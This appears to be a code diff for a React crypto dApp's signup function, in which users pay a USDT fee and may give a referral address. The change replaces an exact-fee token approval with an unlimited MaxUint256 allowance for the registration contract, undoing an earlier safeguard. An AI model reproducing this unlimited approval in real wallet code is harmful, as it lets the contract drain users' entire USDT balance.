@@ -11,7 +11,7 @@ function App() {
   const [history, setHistory] = useState([]);
   const [loading, setLoading] = useState(false);
   const [signupFee, setSignupFee] = useState("1.00");
-  const [refBonus, setRefBonus] = useState("0.00");
+  const [refBonus, setRefBonus] = useState("0.00"); // Referral Bonus State
 
   const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";
 
@@ -44,12 +44,13 @@ function App() {
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       
-      // 1. Exact Fee Approve karein (MaxUint256 ki jagah exact fee)
-      const feeInWei = ethers.parseUnits(signupFee, 18);
-      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, feeInWei);
-      await approveTx.wait();
+      // 1. PEHLE: Approval (Zaroori hai taaki contract USDT nikal sake)
+      console.log("Approving fees...");
+      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
+      await approveTx.wait(); // Wait till approval is confirmed
       
-      // 2. Register call karein
+      // 2. BAAD MEIN: Register call (Ab ye success hoga)
+      console.log("Registering...");
       const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
       const regTx = await coreContract.register(ref);
       await regTx.wait();
@@ -58,8 +59,8 @@ function App() {
       fetchHistory(await signer.getAddress(), new ethers.BrowserProvider(window.ethereum));
       alert("Registration Successful!");
     } catch (e) { 
-      console.error("Signup Error:", e);
-      alert("Signup Failed! Check if you have enough USDT and BNB for Gas."); 
+      console.error(e);
+      alert("Signup Failed! Check if you have enough USDT and BNB for gas."); 
     }
     setLoading(false);
   };
